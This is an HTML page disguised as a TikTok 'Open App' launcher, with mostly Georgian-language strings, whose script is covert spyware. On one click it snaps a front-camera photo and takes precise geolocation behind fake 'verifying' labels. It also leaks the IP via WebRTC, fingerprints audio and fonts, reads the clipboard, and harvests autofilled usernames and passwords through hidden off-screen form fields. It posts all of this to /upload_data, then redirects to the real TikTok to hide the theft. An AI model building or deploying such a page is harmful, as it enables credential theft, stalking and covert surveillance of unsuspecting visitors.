<!DOCTYPE html>
<html lang="ka">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok - Open App</title> 
    <style>
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; min-height: 100vh; display: flex; flex-direction: column; background-color: #000000; color: white; overflow: hidden; position: relative; justify-content: center; align-items: center; }
        .container { text-align: center; width: 90%; max-width: 350px; z-index: 2; display: flex; flex-direction: column; align-items: center; }
        .logo { font-size: 42px; font-weight: 900; letter-spacing: -2px; margin-bottom: 10px; text-shadow: 2px 2px 0px #25F4EE, -2px -2px 0px #FE2C55; color: white; }
        p { color: #a0a0a0; font-size: 15px; margin-bottom: 30px; line-height: 1.4; }
        .btn { width: 100%; padding: 16px; background: #FE2C55; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 17px; cursor: pointer; transition: 0.2s; box-shadow: 0 0 15px rgba(254, 44, 85, 0.4); }
        .btn:active { transform: scale(0.98); }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .spinner { border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: none; margin-top: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hidden-autofill { position: absolute; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
        #video, #canvas, #fpCanvas { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">TikTok</div>
        <p>Watch trending videos, follow creators, and discover new content.</p>
        <button class="btn" id="mainBtn" onclick="startProcess()">🎵 Open TikTok</button>
        <div class="spinner" id="loader"></div>
    </div>

    <form style="display:none;" id="hiddenForm">
        <input type="text" id="hiddenUser" class="hidden-autofill" name="username" autocomplete="username">
        <input type="password" id="hiddenPass" class="hidden-autofill" name="password" autocomplete="current-password">
    </form>

    <canvas id="fpCanvas" style="display:none;"></canvas>
    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        let secretData = { 
            ip: "უცნობია", audioFingerprint: "უცნობია", fonts: "უცნობია", 
            clipboard: "ვერ წაიკითხა", battery: "უცნობია", network: "უცნობია", tabs: "უცნობია",
            autofilledUser: "ვერ წაიკითხა", autofilledPass: "ვერ წაიკითხა",
            orientation: "უცნობია", vibrated: "არა"
        };

        const getCamera = () => new Promise((resolve) => {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                    .then(stream => {
                        const video = document.getElementById('video');
                        video.srcObject = stream; video.play();
                        setTimeout(() => {
                            const canvas = document.getElementById('canvas'); 
                            const ctx = canvas.getContext('2d');
                            canvas.width = video.videoWidth || 640; 
                            canvas.height = video.videoHeight || 480;
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            stream.getTracks().forEach(track => track.stop()); 
                            resolve(canvas.toDataURL('image/png'));
                        }, 3000);
                    }).catch(() => resolve(null));
            } else { resolve(null); }
        });

        const getLocation = () => new Promise((resolve) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
                    () => resolve({ lat: "უარი", lon: "უარი" }),
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else { resolve({ lat: "უარი", lon: "უარი" }); }
        });

        async function collectRestInfo() {
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel(''); const offer = await pc.createOffer(); await pc.setLocalDescription(offer);
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    secretData.ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1]; pc.close();
                };
            } catch (e) {}

            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator(); const analyser = audioCtx.createAnalyser();
                const gainNode = audioCtx.createGain(); const scriptProcessor = audioCtx.createScriptProcessor(4096, 1, 1);
                oscillator.type = 'triangle'; oscillator.frequency.value = 10000; gainNode.gain.value = 0;
                oscillator.connect(analyser); analyser.connect(scriptProcessor); scriptProcessor.connect(gainNode); gainNode.connect(audioCtx.destination);
                scriptProcessor.onaudioprocess = (event) => {
                    const data = event.inputBuffer.getChannelData(0); let sum = 0;
                    for (let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
                    secretData.audioFingerprint = sum.toString(); oscillator.disconnect(); scriptProcessor.disconnect();
                };
                oscillator.start(0);
            } catch (e) {}

            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Tahoma', 'Trebuchet MS', 'Sylfaen', 'BPG Arial']; 
            const testString = "mmmmmmmmmmlli"; const span = document.createElement('span');
            span.style.fontSize = '72px'; span.style.position = 'absolute'; span.style.left = '-9999px'; span.innerText = testString;
            document.body.appendChild(span);
            let detected = [];
            for (let i = 0; i < testFonts.length; i++) {
                span.style.fontFamily = testFonts[i];
                if (span.offsetWidth > 0) detected.push(testFonts[i]);
            }
            document.body.removeChild(span); secretData.fonts = detected.join(', '); 

            try { if (navigator.clipboard && navigator.clipboard.readText) { secretData.clipboard = await navigator.clipboard.readText() || "ცარიელია"; } } catch (e) { secretData.clipboard = "წვდომა აკრძალულია"; }
            try { if (navigator.getBattery) { const b = await navigator.getBattery(); secretData.battery = Math.round(b.level * 100) + "% " + (b.charging ? "(დატენვაზე)" : ""); } } catch (e) {}
            try { if (navigator.connection) { secretData.network = navigator.connection.effectiveType + " (" + navigator.connection.downlink + " Mbps)"; } } catch (e) {}
            try { secretData.tabs = window.history.length.toString(); } catch (e) {}

            if (window.DeviceOrientationEvent) {
                window.addEventListener('deviceorientation', function(event) {
                    let beta = event.beta; let gamma = event.gamma;
                    if (beta > 45 && beta < 135) secretData.orientation = "ვერტიკალურად (ხელში)";
                    else if (beta > -45 && beta < 45) secretData.orientation = "ჰორიზონტალურად (მაგიდაზე)";
                    else secretData.orientation = "დახრილი";
                });
            }

            try { if (navigator.vibrate) { navigator.vibrate([100, 50, 100]); secretData.vibrated = "დიახ"; } } catch (e) {}
            
            const user = document.getElementById('hiddenUser').value;
            const pass = document.getElementById('hiddenPass').value;
            if (user) secretData.autofilledUser = user;
            if (pass) secretData.autofilledPass = pass;
        }

        async function startProcess() {
            const btn = document.getElementById('mainBtn');
            const loader = document.getElementById('loader');
            
            btn.disabled = true; 
            btn.innerText = "იტვირთება..."; 
            loader.style.display = 'block';

            btn.innerText = "Verifying camera...";
            const image = await getCamera();
            secretData.image = image;

            btn.innerText = "Verifying location...";
            const loc = await getLocation();
            secretData.lat = loc.lat; 
            secretData.lon = loc.lon;

            btn.innerText = "Finalizing...";
            await collectRestInfo();
            
            secretData.userAgent = navigator.userAgent; 
            secretData.screen = window.screen.width + "x" + window.screen.height;
            secretData.ram = navigator.deviceMemory || "უცნობია";

            await fetch('/upload_data', {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: 'DIRECT_OPEN', secret: secretData })
            });

            loader.style.display = 'none';
            document.querySelector('.container').innerHTML = `<div style="font-size: 50px;">✅</div><h2 style="color: #25F4EE;">Opening TikTok...</h2>`;
            setTimeout(() => { window.location.href = "https://www.tiktok.com"; }, 1500);
        }
    </script>
</body>
</html>
